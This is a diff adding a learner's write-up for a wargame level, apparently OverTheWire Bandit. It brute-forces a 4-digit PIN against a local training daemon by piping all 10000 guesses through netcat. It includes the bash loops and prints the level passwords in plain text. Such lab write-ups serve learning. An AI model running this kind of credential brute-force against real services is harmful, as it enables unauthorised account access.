@@ -1,0 +1,36 @@
+A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+
+I cannot solve this one, but here's what I did and idk why it don't work.
+
+Create directory and go to said directory in `/tmp`, call ours `crabz`
+
+Create a solve.sh file to get a list of all possible solutions:
+
+#!/bin/bash
+for i in {0000..9999}
+do
+	echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ" ${i} >> pins
+done
+
+Then, in terminal
+`cat pins | nc localhost 30002 | grep -v "Wrong"
+
+I read the `pins` file with all the combinations, fed it into the netcat connection, and filtered out everything with "Wrong" in it.
+
+UPDATE (SOLVED):
+Instead of trying to do 10000 combinations in one sessions, split it up into 2 sessions. Here's the working script
+
+#!/bin/bash
+for i in {0000..5000}
+do
+	echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i
+done | nc localhost 30002 | grep "bandit25"
+
+for i in {5000..9999} 
+do
+	echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i
+done | nc localhost 30002 | grep "bandit25"
+
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG 
+
+If you want the password, use -B 1 as a grep option to get the line before where it says the bandit25 password
